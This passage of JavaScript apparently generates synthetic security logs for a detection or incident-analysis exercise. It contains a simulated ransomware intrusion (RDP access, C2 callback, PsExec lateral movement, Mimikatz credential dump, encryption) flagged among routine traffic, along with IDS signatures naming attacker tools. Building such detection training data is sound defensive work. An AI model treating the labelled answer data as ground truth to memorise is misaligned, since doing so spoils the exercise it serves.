  _la.e('00:42:45', 'web', 'info',
    '10.0.6.15 POST /api/cron/report — 200 OK — cron-agent/1.2',
    null, false, null);

  _la.e('00:43:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _la.e('00:43:15', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:44000 → 10.0.7.10:5432 — db-maintenance',
    null, false, null);

  _la.e('00:43:30', 'ids', 'info',
    'Heartbeat: IDS engine running — 8421 rules active',
    null, false, null);

  _la.e('00:43:45', 'dns', 'info',
    'A query registry.terraform.io from 10.0.6.15',
    null, false, null);

  _la.e('00:44:00', 'fw', 'info',
    'ALLOW TCP 10.0.3.10:587 → 74.125.200.108:587 — smtp-outbound',
    null, false, null);

  _la.e('00:44:15', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _la.e('00:44:30', 'web', 'info',
    '104.16.55.2 GET /static/images/logo.svg — 304 Not Modified — CDN-Cache/2.1',
    null, false, null);

  _la.e('00:44:45', 'dns', 'info',
    'A query status.aws.amazon.com from 10.0.6.15',
    null, false, null);

  _la.e('00:45:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _la.e('00:45:15', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:44100 → 52.217.44.68:443 — s3-backup-sync',
    null, false, null);

  _la.e('00:45:30', 'web', 'info',
    '13.107.42.14 GET /about — 200 OK — bingbot/2.0',
    null, false, null);

  _la.e('00:45:45', 'dns', 'info',
    'AAAA query crl.digicert.com from 10.0.1.50',
    null, false, null);

  _la.e('00:46:00', 'fw', 'info',
    'ALLOW TCP 10.0.1.50:443 → 93.184.220.29:80 — crl-check',
    null, false, null);

  _la.e('00:46:15', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _la.e('00:46:30', 'web', 'info',
    '10.0.6.15 POST /api/cron/cleanup — 200 OK — cron-agent/1.2',
    null, false, null);

  _la.e('00:46:45', 'dns', 'info',
    'A query ifconfig.me from 10.0.1.50',
    null, false, null);

  _la.e('00:47:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _la.e('00:47:15', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:44200 → 10.0.7.10:5432 — db-maintenance',
    null, false, null);

  _la.e('00:47:30', 'fw', 'info',
    'ALLOW TCP 10.0.3.10:25 → 10.0.0.2:53 — mail-dns',
    null, false, null);

  _la.e('00:47:45', 'web', 'info',
    '104.16.55.2 GET /static/fonts/inter.woff2 — 304 Not Modified — CDN-Cache/2.1',
    null, false, null);

  _la.e('00:48:00', 'dns', 'info',
    'A query ghcr.io from 10.0.6.15',
    null, false, null);

  _la.e('00:48:15', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _la.e('00:48:30', 'ids', 'low',
    'Traffic anomaly: outbound DNS queries +8% — seasonal variance',
    null, false, null);

  _la.e('00:48:45', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:44300 → 91.189.91.39:443 — apt-update',
    null, false, null);

  _la.e('00:49:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _la.e('00:49:15', 'dns', 'info',
    'A query apt.releases.hashicorp.com from 10.0.6.15',
    null, false, null);

  _la.e('00:49:30', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:44400 → 18.232.227.86:443 — hashicorp-apt',
    null, false, null);

  _la.e('00:49:45', 'web', 'info',
    '13.107.42.14 GET /sitemap.xml — 200 OK — bingbot/2.0',
    null, false, null);

  _la.e('00:50:00', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _la.e('00:50:15', 'fw', 'info',
    'ALLOW TCP 10.0.3.10:587 → 74.125.200.108:587 — smtp-outbound',
    null, false, null);

  _la.e('00:50:30', 'dns', 'info',
    'A query graph.microsoft.com from 10.0.1.50',
    null, false, null);

  _la.e('00:50:45', 'web', 'info',
    '10.0.6.15 POST /api/cron/heartbeat — 200 OK — cron-agent/1.2',
    null, false, null);

  _la.e('00:51:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  var LOG_ANALYSIS = _la.entries;

  /* ════════════════════════════════════════════════════
     Active Containment — 2024-05-06 02:00–03:30 UTC
     ════════════════════════════════════════════════════

     Attacker:     185.141.63.22
     Initial host: 10.0.5.10 (dc-admin-ws01, exposed RDP)
     Lateral:      10.0.5.11 (file-server-01)
                   10.0.5.12 (hr-workstation-03)
                   10.0.5.13 (dc01 — domain controller)
     C2 server:    91.240.118.200
     DNS server:   10.0.0.2
     Print server: 10.0.6.30

     Normal IPs:
       10.0.4.55      — health check
       91.189.92.10   — internal monitoring
       10.0.1.50      — web server
       10.0.3.10      — mail server
       10.0.6.15      — cron / batch server
       72.44.128.90   — remote employee (VPN)
     ════════════════════════════════════════════════════ */

  var _ac = makeCorpus('2024-05-06 ');

  /* ── Normal overnight traffic ────────────────────── */

  _ac.e('02:00:01', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    { srcIp: '10.0.4.55', dstIp: '10.0.1.50', dstPort: 443, method: 'GET', path: '/api/health', status: 200, bytes: 48, userAgent: 'internal-monitor/1.0' },
    false, null);

  _ac.e('02:00:15', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:38400 → 10.0.7.10:5432 — db-backup',
    { action: 'ALLOW', proto: 'TCP', srcIp: '10.0.6.15', srcPort: 38400, dstIp: '10.0.7.10', dstPort: 5432, rule: 'db-backup' },
    false, null);

  _ac.e('02:00:30', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    { srcIp: '91.189.92.10', dstIp: '10.0.1.50', dstPort: 443, method: 'GET', path: '/api/metrics', status: 200, bytes: 8400, userAgent: 'prometheus/2.45' },
    false, null);

  _ac.e('02:00:45', 'dns', 'info',
    'A query backup.internal.lab from 10.0.6.15',
    null, false, null);

  _ac.e('02:01:00', 'web', 'info',
    '10.0.6.15 POST /api/backup/start — 200 OK — cron-agent/1.2',
    null, false, null);

  _ac.e('02:01:15', 'fw', 'info',
    'ALLOW TCP 10.0.6.30:9100 → 91.189.92.10:9090 — print-metrics',
    { action: 'ALLOW', proto: 'TCP', srcIp: '10.0.6.30', srcPort: 9100, dstIp: '91.189.92.10', dstPort: 9090, rule: 'print-metrics' },
    false, null);

  _ac.e('02:01:30', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _ac.e('02:01:45', 'auth', 'info',
    'Service account svc-backup login from 10.0.6.15 — scheduled task',
    { event: 'login_success', user: 'svc-backup', srcIp: '10.0.6.15', sessionId: 'sess_svc_bk01', mfa: false },
    false, null);

  _ac.e('02:02:00', 'dns', 'info',
    'A query ntp.ubuntu.com from 10.0.6.15',
    null, false, null);

  _ac.e('02:02:15', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:42100 → 10.0.7.10:5432 — db-backup',
    null, false, null);

  _ac.e('02:02:30', 'ids', 'low',
    'Scheduled scan: Nessus vulnerability scan from 10.0.8.5 — normal',
    null, false, null);

  _ac.e('02:02:45', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _ac.e('02:03:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _ac.e('02:03:15', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:42200 → 10.0.7.10:5432 — db-backup',
    null, false, null);

  _ac.e('02:03:30', 'dns', 'info',
    'A query updates.ubuntu.com from 10.0.6.15',
    null, false, null);

  _ac.e('02:03:45', 'auth', 'info',
    'VPN connect user=jthompson from 72.44.128.90 — on-call shift',
    { event: 'vpn_connect', user: 'jthompson', srcIp: '72.44.128.90', tunnelId: 'vpn_jt_oc1', assignedIp: '10.10.0.20' },
    false, null);

  _ac.e('02:04:00', 'web', 'info',
    '72.44.128.90 GET /dashboard — 200 OK',
    null, false, null);

  _ac.e('02:04:15', 'fw', 'info',
    'ALLOW TCP 10.0.3.10:587 → 74.125.200.108:587 — smtp-outbound',
    null, false, null);

  _ac.e('02:04:30', 'web', 'info',
    '10.0.6.15 POST /api/backup/chunk — 200 OK — cron-agent/1.2',
    null, false, null);

  _ac.e('02:04:45', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _ac.e('02:05:00', 'dns', 'info',
    'A query time.google.com from 10.0.1.50',
    null, false, null);

  /* ── Initial access: compromised RDP ─────────────── */

  _ac.e('02:05:30', 'fw', 'warning',
    'ALLOW TCP 185.141.63.22:49201 → 10.0.5.10:3389 — rdp-external',
    { action: 'ALLOW', proto: 'TCP', srcIp: '185.141.63.22', srcPort: 49201, dstIp: '10.0.5.10', dstPort: 3389, rule: 'rdp-external' },
    true, 'initial-access');

  _ac.e('02:05:45', 'auth', 'warning',
    'Login success user=admin from 185.141.63.22 via RDP — no MFA',
    { event: 'login_success', user: 'admin', srcIp: '185.141.63.22', method: 'RDP', sessionId: 'rdp_adm_x01', mfa: false, geo: 'BY' },
    true, 'initial-access');

  _ac.e('02:06:00', 'ids', 'medium',
    'RDP login from external IP 185.141.63.22 to 10.0.5.10 — unusual hours',
    { alertId: 'RDP-EXT-001', srcIp: '185.141.63.22', dstIp: '10.0.5.10', dstPort: 3389, action: 'ALERT', signature: 'External RDP After Hours' },
    true, 'initial-access');

  /* ── Interleaved normal traffic ──────────────────── */

  _ac.e('02:06:15', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _ac.e('02:06:30', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:42300 → 10.0.7.10:5432 — db-backup',
    null, false, null);

  _ac.e('02:06:45', 'web', 'info',
    '72.44.128.90 GET /api/notifications — 200 OK',
    null, false, null);

  _ac.e('02:07:00', 'dns', 'info',
    'A query api.pagerduty.com from 10.0.1.50',
    null, false, null);

  _ac.e('02:07:15', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  /* ── C2 callback ─────────────────────────────────── */

  _ac.e('02:07:30', 'fw', 'warning',
    'ALLOW TCP 10.0.5.10:61200 → 91.240.118.200:443 — outbound-https',
    { action: 'ALLOW', proto: 'TCP', srcIp: '10.0.5.10', srcPort: 61200, dstIp: '91.240.118.200', dstPort: 443, rule: 'outbound-https' },
    true, 'c2-callback');

  _ac.e('02:07:45', 'dns', 'info',
    'A query cdn-update.systemcheck.xyz from 10.0.5.10',
    { queryType: 'A', domain: 'cdn-update.systemcheck.xyz', srcIp: '10.0.5.10', response: '91.240.118.200', ttl: 60 },
    true, 'c2-callback');

  /* ── Normal traffic ──────────────────────────────── */

  _ac.e('02:08:00', 'web', 'info',
    '10.0.6.15 POST /api/backup/chunk — 200 OK — cron-agent/1.2',
    null, false, null);

  _ac.e('02:08:15', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _ac.e('02:08:30', 'fw', 'info',
    'ALLOW TCP 10.0.6.30:631 → 10.0.5.11:445 — print-smb',
    { action: 'ALLOW', proto: 'TCP', srcIp: '10.0.6.30', srcPort: 631, dstIp: '10.0.5.11', dstPort: 445, rule: 'print-smb' },
    false, null);

  _ac.e('02:08:45', 'dns', 'info',
    'A query crl.digicert.com from 10.0.1.50',
    null, false, null);

  /* ── Lateral movement via SMB ────────────────────── */

  _ac.e('02:09:00', 'fw', 'warning',
    'ALLOW TCP 10.0.5.10:49300 → 10.0.5.11:445 — smb-internal',
    { action: 'ALLOW', proto: 'TCP', srcIp: '10.0.5.10', srcPort: 49300, dstIp: '10.0.5.11', dstPort: 445, rule: 'smb-internal' },
    true, 'lateral-movement');

  _ac.e('02:09:15', 'ids', 'medium',
    'SMB lateral movement: 10.0.5.10 → 10.0.5.11 (file-server-01) — PsExec signature',
    { alertId: 'LAT-SMB-001', srcIp: '10.0.5.10', dstIp: '10.0.5.11', dstPort: 445, action: 'ALERT', signature: 'PsExec Remote Execution' },
    true, 'lateral-movement');

  _ac.e('02:09:30', 'auth', 'warning',
    'Login success user=admin from 10.0.5.10 to 10.0.5.11 via SMB',
    { event: 'login_success', user: 'admin', srcIp: '10.0.5.10', dstIp: '10.0.5.11', method: 'SMB', sessionId: 'smb_lat_01' },
    true, 'lateral-movement');

  /* ── Normal traffic ──────────────────────────────── */

  _ac.e('02:09:45', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _ac.e('02:10:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _ac.e('02:10:15', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:42400 → 10.0.7.10:5432 — db-backup',
    null, false, null);

  _ac.e('02:10:30', 'web', 'info',
    '72.44.128.90 GET /reports/daily — 200 OK',
    null, false, null);

  /* ── Further lateral movement ────────────────────── */

  _ac.e('02:11:00', 'fw', 'warning',
    'ALLOW TCP 10.0.5.10:49400 → 10.0.5.12:445 — smb-internal',
    { action: 'ALLOW', proto: 'TCP', srcIp: '10.0.5.10', srcPort: 49400, dstIp: '10.0.5.12', dstPort: 445, rule: 'smb-internal' },
    true, 'lateral-movement');

  _ac.e('02:11:15', 'ids', 'medium',
    'SMB lateral movement: 10.0.5.10 → 10.0.5.12 (hr-workstation-03) — PsExec signature',
    { alertId: 'LAT-SMB-002', srcIp: '10.0.5.10', dstIp: '10.0.5.12', dstPort: 445, action: 'ALERT', signature: 'PsExec Remote Execution' },
    true, 'lateral-movement');

  _ac.e('02:11:30', 'auth', 'warning',
    'Login success user=admin from 10.0.5.10 to 10.0.5.12 via SMB',
    { event: 'login_success', user: 'admin', srcIp: '10.0.5.10', dstIp: '10.0.5.12', method: 'SMB', sessionId: 'smb_lat_02' },
    true, 'lateral-movement');

  /* ── Normal traffic ──────────────────────────────── */

  _ac.e('02:11:45', 'web', 'info',
    '10.0.6.15 POST /api/backup/chunk — 200 OK — cron-agent/1.2',
    null, false, null);

  _ac.e('02:12:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _ac.e('02:12:15', 'dns', 'info',
    'A query updates.ubuntu.com from 10.0.6.15',
    null, false, null);

  _ac.e('02:12:30', 'fw', 'info',
    'ALLOW TCP 10.0.3.10:587 → 74.125.200.108:587 — smtp-outbound',
    null, false, null);

  _ac.e('02:12:45', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  /* ── Privilege escalation ────────────────────────── */

  _ac.e('02:13:00', 'fw', 'warning',
    'ALLOW TCP 10.0.5.10:49500 → 10.0.5.13:445 — smb-internal',
    { action: 'ALLOW', proto: 'TCP', srcIp: '10.0.5.10', srcPort: 49500, dstIp: '10.0.5.13', dstPort: 445, rule: 'smb-internal' },
    true, 'privilege-escalation');

  _ac.e('02:13:15', 'ids', 'high',
    'Privilege escalation: 10.0.5.10 targeting domain controller 10.0.5.13 (dc01) — Mimikatz signature',
    { alertId: 'PRIV-ESC-001', srcIp: '10.0.5.10', dstIp: '10.0.5.13', dstPort: 445, action: 'ALERT', signature: 'Mimikatz Credential Dump', severity: 'critical' },
    true, 'privilege-escalation');

  _ac.e('02:13:30', 'auth', 'critical',
    'Login success user=DOMAIN\\Administrator from 10.0.5.10 to 10.0.5.13 via SMB',
    { event: 'login_success', user: 'DOMAIN\\Administrator', srcIp: '10.0.5.10', dstIp: '10.0.5.13', method: 'SMB', sessionId: 'smb_dc_01', privilege: 'domain_admin' },
    true, 'privilege-escalation');

  /* ── Normal traffic ──────────────────────────────── */

  _ac.e('02:13:45', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _ac.e('02:14:00', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:42500 → 10.0.7.10:5432 — db-backup',
    null, false, null);

  _ac.e('02:14:15', 'web', 'info',
    '72.44.128.90 GET /api/tasks — 200 OK',
    null, false, null);

  _ac.e('02:14:30', 'fw', 'info',
    'ALLOW TCP 10.0.6.30:9100 → 91.189.92.10:9090 — print-metrics',
    null, false, null);

  _ac.e('02:14:45', 'dns', 'info',
    'A query api.slack.com from 10.0.1.50',
    null, false, null);

  /* ── Encryption begins ───────────────────────────── */

  _ac.e('02:15:00', 'ids', 'critical',
    'Ransomware activity: mass file rename detected on 10.0.5.11 — .locked extension',
    { alertId: 'RANSOM-001', srcIp: '10.0.5.11', action: 'ALERT', signature: 'Mass File Rename Ransomware', filesAffected: 142, extension: '.locked' },
    true, 'encryption-start');

  _ac.e('02:15:15', 'ids', 'critical',
    'Ransomware activity: mass file rename detected on 10.0.5.12 — .locked extension',
    { alertId: 'RANSOM-002', srcIp: '10.0.5.12', action: 'ALERT', signature: 'Mass File Rename Ransomware', filesAffected: 87, extension: '.locked' },
    true, 'encryption-start');

  _ac.e('02:15:30', 'fw', 'warning',
    'ALLOW TCP 10.0.5.13:61300 → 91.240.118.200:443 — outbound-https',
    { action: 'ALLOW', proto: 'TCP', srcIp: '10.0.5.13', srcPort: 61300, dstIp: '91.240.118.200', dstPort: 443, rule: 'outbound-https' },
    true, 'c2-callback');

  /* ── Normal traffic ──────────────────────────────── */

  _ac.e('02:15:45', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _ac.e('02:16:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _ac.e('02:16:15', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:42600 → 10.0.7.10:5432 — db-backup',
    null, false, null);

  /* ── Ransom note ─────────────────────────────────── */

  _ac.e('02:16:30', 'ids', 'critical',
    'Ransom note detected on 10.0.5.11: README_RESTORE.txt created in 23 directories',
    { alertId: 'RANSOM-NOTE-001', srcIp: '10.0.5.11', action: 'ALERT', signature: 'Ransom Note File Creation', fileName: 'README_RESTORE.txt', directories: 23 },
    true, 'ransom-note');

  _ac.e('02:16:45', 'ids', 'critical',
    'Ransom note detected on 10.0.5.12: README_RESTORE.txt created in 15 directories',
    { alertId: 'RANSOM-NOTE-002', srcIp: '10.0.5.12', action: 'ALERT', signature: 'Ransom Note File Creation', fileName: 'README_RESTORE.txt', directories: 15 },
    true, 'ransom-note');

  _ac.e('02:17:00', 'ids', 'critical',
    'Ransomware activity: mass file rename detected on 10.0.5.10 — .locked extension',
    { alertId: 'RANSOM-003', srcIp: '10.0.5.10', action: 'ALERT', signature: 'Mass File Rename Ransomware', filesAffected: 203, extension: '.locked' },
    true, 'encryption-start');

  /* ── Normal traffic continues ────────────────────── */

  _ac.e('02:17:15', 'web', 'info',
    '72.44.128.90 POST /api/tasks — 201 Created',
    null, false, null);

  _ac.e('02:17:30', 'web', 'info',
    '10.0.6.15 POST /api/backup/chunk — 200 OK — cron-agent/1.2',
    null, false, null);

  _ac.e('02:17:45', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _ac.e('02:18:00', 'fw', 'info',
    'ALLOW TCP 10.0.6.30:9100 → 91.189.92.10:9090 — print-metrics',
    null, false, null);

  _ac.e('02:18:15', 'dns', 'info',
    'A query s3.amazonaws.com from 10.0.6.15',
    null, false, null);

  _ac.e('02:18:30', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _ac.e('02:18:45', 'ids', 'critical',
    'Ransom note detected on 10.0.5.10: README_RESTORE.txt created in 31 directories',
    { alertId: 'RANSOM-NOTE-003', srcIp: '10.0.5.10', action: 'ALERT', signature: 'Ransom Note File Creation', fileName: 'README_RESTORE.txt', directories: 31 },
    true, 'ransom-note');

  _ac.e('02:19:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _ac.e('02:19:15', 'fw', 'info',
    'ALLOW TCP 10.0.3.10:587 → 74.125.200.108:587 — smtp-outbound',
    null, false, null);

  _ac.e('02:19:30', 'dns', 'info',
    'A query archive.ubuntu.com from 10.0.6.15',
    null, false, null);

  _ac.e('02:19:45', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:42700 → 10.0.7.10:5432 — db-backup',
    null, false, null);

  _ac.e('02:20:00', 'web', 'info',
    '72.44.128.90 GET /dashboard — 200 OK',
    null, false, null);

  _ac.e('02:20:15', 'auth', 'info',
    'Service account svc-backup logout from 10.0.6.15',
    null, false, null);

  _ac.e('02:20:30', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _ac.e('02:20:45', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _ac.e('02:21:00', 'fw', 'info',
    'ALLOW TCP 10.0.6.30:631 → 10.0.5.11:445 — print-smb',
    null, false, null);

  _ac.e('02:21:15', 'dns', 'info',
    'A query api.github.com from 10.0.6.15',
    null, false, null);

  _ac.e('02:21:30', 'web', 'info',
    '72.44.128.90 GET /api/notifications — 200 OK',
    null, false, null);

  _ac.e('02:21:45', 'auth', 'info',
    'VPN disconnect user=jthompson tunnel=vpn_jt_oc1',
    null, false, null);

  _ac.e('02:22:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _ac.e('02:22:15', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _ac.e('02:22:30', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:42800 → 52.217.44.68:443 — s3-backup-sync',
    null, false, null);

  _ac.e('02:22:45', 'dns', 'info',
    'A query connectivity-check.ubuntu.com from 10.0.6.15',
    null, false, null);

  _ac.e('02:23:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _ac.e('02:23:15', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:42900 → 10.0.7.10:5432 — db-backup',
    null, false, null);

  _ac.e('02:23:30', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _ac.e('02:23:45', 'dns', 'info',
    'A query ntp.ubuntu.com from 10.0.6.15',
    null, false, null);

  _ac.e('02:24:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _ac.e('02:24:15', 'fw', 'info',
    'ALLOW TCP 10.0.3.10:587 → 74.125.200.108:587 — smtp-outbound',
    null, false, null);

  _ac.e('02:24:30', 'fw', 'info',
    'ALLOW TCP 10.0.6.30:9100 → 91.189.92.10:9090 — print-metrics',
    null, false, null);

  _ac.e('02:24:45', 'dns', 'info',
    'A query updates.ubuntu.com from 10.0.6.15',
    null, false, null);

  _ac.e('02:25:00', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _ac.e('02:25:15', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:43000 → 10.0.7.10:5432 — db-backup',
    null, false, null);

  _ac.e('02:25:30', 'web', 'info',
    '10.0.6.15 POST /api/backup/chunk — 200 OK — cron-agent/1.2',
    null, false, null);

  _ac.e('02:25:45', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _ac.e('02:26:00', 'dns', 'info',
    'A query crl.digicert.com from 10.0.1.50',
    null, false, null);

  _ac.e('02:26:15', 'fw', 'info',
    'ALLOW TCP 10.0.1.50:443 → 93.184.220.29:80 — crl-check',
    null, false, null);

  _ac.e('02:26:30', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _ac.e('02:26:45', 'fw', 'info',
    'ALLOW TCP 10.0.6.30:631 → 10.0.5.11:445 — print-smb',
    null, false, null);

  _ac.e('02:27:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _ac.e('02:27:15', 'dns', 'info',
    'A query registry.npmjs.org from 10.0.6.15',
    null, false, null);

  _ac.e('02:27:30', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:43100 → 10.0.7.10:5432 — db-backup',
    null, false, null);

  _ac.e('02:27:45', 'web', 'info',
    '10.0.6.15 POST /api/backup/chunk — 200 OK — cron-agent/1.2',
    null, false, null);

  _ac.e('02:28:00', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _ac.e('02:28:15', 'fw', 'info',
    'ALLOW TCP 10.0.3.10:25 → 10.0.0.2:53 — mail-dns',
    null, false, null);

  _ac.e('02:28:30', 'dns', 'info',
    'MX query internal.lab from 10.0.3.10',
    null, false, null);

  _ac.e('02:28:45', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _ac.e('02:29:00', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:43200 → 52.217.44.68:443 — s3-backup-sync',
    null, false, null);

  _ac.e('02:29:15', 'ids', 'info',
    'Heartbeat: IDS engine running — 8450 rules active',
    null, false, null);

  _ac.e('02:29:30', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _ac.e('02:29:45', 'dns', 'info',
    'A query pypi.org from 10.0.6.15',
    null, false, null);

  _ac.e('02:30:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _ac.e('02:30:15', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:43300 → 10.0.7.10:5432 — db-backup',
    null, false, null);

  _ac.e('02:30:30', 'web', 'info',
    '10.0.6.15 POST /api/backup/complete — 200 OK — cron-agent/1.2',
    null, false, null);

  _ac.e('02:30:45', 'fw', 'info',
    'ALLOW TCP 10.0.6.30:9100 → 91.189.92.10:9090 — print-metrics',
    null, false, null);

  _ac.e('02:31:00', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _ac.e('02:31:15', 'dns', 'info',
    'A query archive.ubuntu.com from 10.0.6.15',
    null, false, null);

  _ac.e('02:31:30', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:43400 → 91.189.91.39:443 — apt-update',
    null, false, null);

  _ac.e('02:31:45', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _ac.e('02:32:00', 'fw', 'info',
    'ALLOW TCP 10.0.3.10:587 → 74.125.200.108:587 — smtp-outbound',
    null, false, null);

  _ac.e('02:32:15', 'dns', 'info',
    'A query time.google.com from 10.0.1.50',
    null, false, null);

  _ac.e('02:32:30', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _ac.e('02:32:45', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:43500 → 10.0.7.10:5432 — db-maintenance',
    null, false, null);

  _ac.e('02:33:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _ac.e('02:33:15', 'dns', 'info',
    'A query api.github.com from 10.0.6.15',
    null, false, null);

  _ac.e('02:33:30', 'fw', 'info',
    'ALLOW TCP 10.0.6.30:631 → 10.0.5.11:445 — print-smb',
    null, false, null);

  _ac.e('02:33:45', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _ac.e('02:34:00', 'fw', 'info',
    'ALLOW TCP 10.0.3.10:25 → 10.0.0.2:53 — mail-dns',
    null, false, null);

  _ac.e('02:34:15', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _ac.e('02:34:30', 'dns', 'info',
    'A query ocsp.pki.goog from 10.0.1.50',
    null, false, null);

  _ac.e('02:34:45', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:43600 → 10.0.7.10:5432 — db-maintenance',
    null, false, null);

  _ac.e('02:35:00', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _ac.e('02:35:15', 'fw', 'info',
    'ALLOW TCP 10.0.6.30:9100 → 91.189.92.10:9090 — print-metrics',
    null, false, null);

  _ac.e('02:35:30', 'web', 'info',
    '10.0.6.15 POST /api/cron/heartbeat — 200 OK — cron-agent/1.2',
    null, false, null);

  _ac.e('02:35:45', 'dns', 'info',
    'AAAA query s3.amazonaws.com from 10.0.6.15',
    null, false, null);

  _ac.e('02:36:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  _ac.e('02:36:15', 'fw', 'info',
    'ALLOW TCP 10.0.3.10:587 → 74.125.200.108:587 — smtp-outbound',
    null, false, null);

  _ac.e('02:36:30', 'ids', 'info',
    'Heartbeat: IDS engine running — 8450 rules active',
    null, false, null);

  _ac.e('02:36:45', 'web', 'info',
    '91.189.92.10 GET /api/metrics — 200 OK — prometheus/2.45',
    null, false, null);

  _ac.e('02:37:00', 'dns', 'info',
    'A query fonts.googleapis.com from 10.0.1.50',
    null, false, null);

  _ac.e('02:37:15', 'fw', 'info',
    'ALLOW TCP 10.0.6.15:43700 → 52.217.44.68:443 — s3-backup-sync',
    null, false, null);

  _ac.e('02:37:30', 'web', 'info',
